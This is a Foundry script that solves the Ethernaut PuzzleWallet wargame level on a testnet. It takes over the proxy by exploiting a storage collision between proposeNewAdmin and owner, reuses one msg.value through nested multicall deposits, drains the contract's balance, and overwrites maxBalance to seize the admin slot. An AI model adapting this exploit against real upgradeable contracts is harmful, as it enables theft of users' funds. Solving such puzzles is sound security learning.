// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.5;
pragma experimental ABIEncoderV2;

import "forge-std/Script.sol";
import "../src/PuzzleWallet.sol";

// instance addr: 0x3aE109387881Fcbc4c39d9070cc4943e4bA76962
// block: 7867469
// anvil -f $GOERLI_RPC_URL --fork-block-number 7867496
// forge script script/PuzzleWallet.s.sol:PuzzleWalletSolution --fork-url http://127.0.0.1:8545 --broadcast -vvv
// forge script script/PuzzleWallet.s.sol:PuzzleWalletSolution --rpc-url $GOERLI_RPC_URL --broadcast -vvv

contract PuzzleWalletSolution is Script {
    address payable instanceAddr = 0x3aE109387881Fcbc4c39d9070cc4943e4bA76962;

    function setUp() public {}

    function run() public {
        //uint256 attackerPK = vm.envUint("ANVIL_PRIVATE_KEY");
        uint256 attackerPK = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(attackerPK);

        PuzzleWallet wallet = PuzzleWallet(instanceAddr);
        PuzzleProxy proxy = PuzzleProxy(instanceAddr);
        address attackerAddr = vm.addr(attackerPK);
        
        // set owner by setting pendingAdmin 
        console.log(wallet.owner());
        proxy.proposeNewAdmin(attackerAddr);
        console.log(wallet.owner());
        
        // add attacker to whitelist
        wallet.addToWhitelist(attackerAddr);

       
        // call multicall with multicall(deposit()) parameters to bypass mgs.value check
        bytes[] memory callArray = new bytes[](4);
        bytes[] memory depositArray = new bytes[](1);
        depositArray[0] = abi.encodeWithSelector(wallet.deposit.selector);

        for (uint i = 0; i < 4; i++) {
            callArray[i] = abi.encodeWithSelector(wallet.multicall.selector, depositArray);
        }
        
        wallet.multicall{value: instanceAddr.balance/2}(callArray);
        
        // call execute to make maxBalance = 0
        wallet.execute(attackerAddr, instanceAddr.balance, "");

        // set admin by setting maxBalance 
        console.log(proxy.admin());
        wallet.setMaxBalance(uint256(uint160(attackerAddr)));        
        console.log(proxy.admin());
 
        // check the result
        require(proxy.admin() == attackerAddr);
        
        vm.stopBroadcast();
    }
}
